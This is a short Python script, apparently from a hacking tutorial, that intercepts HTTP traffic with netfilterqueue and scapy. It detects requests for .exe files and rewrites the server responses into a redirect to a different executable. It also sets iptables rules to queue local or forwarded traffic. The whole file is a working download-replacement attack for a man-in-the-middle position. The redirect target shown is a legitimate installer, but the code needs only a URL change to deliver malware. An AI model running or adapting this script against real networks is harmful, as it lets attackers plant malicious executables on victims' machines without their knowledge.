#!/usr/bin/env python
import netfilterqueue
import subprocess
import scapy.all as scapy

ack_list = []

def proccess_packet(packet):
    scapy_packet = scapy.IP(packet.get_payload())
    if scapy_packet.haslayer(scapy.Raw):
        if scapy_packet[scapy.TCP].dport == 80:
            print("\n[+] HTTP Request")
            if ".exe" in scapy_packet[scapy.Raw].load:
                print("[+] Exe Request")
                ack_list.append(scapy_packet[scapy.TCP].ack)
                print(scapy_packet.show())

        elif scapy_packet[scapy.TCP].sport == 80:
            if scapy_packet[scapy.TCP].seq in ack_list:
                ack_list.remove(scapy_packet[scapy.TCP].seq)
                print("[+] Replacing File")
                scapy_packet[scapy.Raw].load = " HTTP/1.1 301 Moved Permanently\nLocation: https://www.rarlab.com/rar/winrar-x64-59b3.exe\n\n"
                del scapy_packet[scapy.IP].len
                del scapy_packet[scapy.IP].chksum
                del scapy_packet[scapy.TCP].chksum
                packet.set_payload(str(scapy_packet))

    packet.accept()

# For local Testing
subprocess.call("iptables -I OUTPUT -j NFQUEUE --queue-num 0", shell=True)
subprocess.call("iptables -I INPUT -j NFQUEUE --queue-num 0", shell=True)

# For Forwarding remote network
# subprocess.call("iptables -I FORWARD -j NFQUEUE --queue-num 0", shell=True)

try:
    while True:
        queue = netfilterqueue.NetfilterQueue()
        queue.bind(0, proccess_packet)
        queue.run()
except KeyboardInterrupt:
    subprocess.call("iptables --flush", shell=True)
    print("\nStopped.. IP Tables Flushed")